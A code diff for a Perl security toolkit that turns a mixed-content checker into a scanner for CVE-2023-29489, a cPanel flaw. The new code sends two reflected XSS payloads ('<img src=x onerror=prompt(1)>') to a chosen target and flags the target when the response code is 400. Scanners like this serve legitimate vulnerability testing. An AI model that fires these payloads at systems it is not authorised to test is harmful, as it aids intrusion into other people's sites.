@@ -1,11 +1,11 @@
-package Spellbook::Exploit::Mixed_Content {
+package Spellbook::Advisory::CVE_2023_29489 {
     use strict;
     use warnings;
     use LWP::UserAgent;
-    
+
     sub new {
         my ($self, $parameters) = @_;
-        my ($help, $target, @result, @urls);
+        my ($help, $target, @result);
 
         Getopt::Long::GetOptionsFromArray (
             $parameters,
@@ -13,11 +13,11 @@ package Spellbook::Exploit::Mixed_Content {
             "t|target=s" => \$target
         );
 
-        if ($target) {
+        if ($target) {    
             if ($target !~ /^http(s)?:\/\//) { 
                 $target = "https://$target";
             }
-
+                    
             my $userAgent = LWP::UserAgent -> new (
                 timeout  => 5,
                 ssl_opts => { 
@@ -26,31 +26,31 @@ package Spellbook::Exploit::Mixed_Content {
                 }
             );
 
-            my $request   = $userAgent -> get($target);
+            my @payloads = (
+                "/cpanelwebcall/<img%20src=x%20onerror=\"prompt(1)\">aaaaaaaaaaaa",
+                "/<img%20src=x%20onerror=\"prompt(1)\">aaaaaaaaaaaa"
+            );
 
-            for (($request -> content =~ /src="([^"]+)"/g) || ($request -> content =~ /href="([^"]+)"/g)){
-                push @urls, $1;      
-            }
+            foreach my $payload (@payloads) {
+                my $request = $userAgent -> get("$target/$payload");
 
-            foreach my $url (@urls) {
-                if ($url =~ /^http?:\/\//) {
-                    push @result, "[+] $target - $url";
+                if ($request -> code() == 400 ) {
+                    push @result, $target;
                 }
             }
 
             return @result;
-        } 
+        }
 
         if ($help) {
             return "
-                \rExploit::Mixed_Content
-                \r=====================
+                \rExploit::CVE_2023_29489
+                \r=======================
                 \r-h, --help     See this menu
-                \r-t, --target   Define a target to perform the analysis\n
-            ";
+                \r-t, --target   Define a target\n\n";
         }
 
-        return 0;
+        return 0;   
     }
 }
 
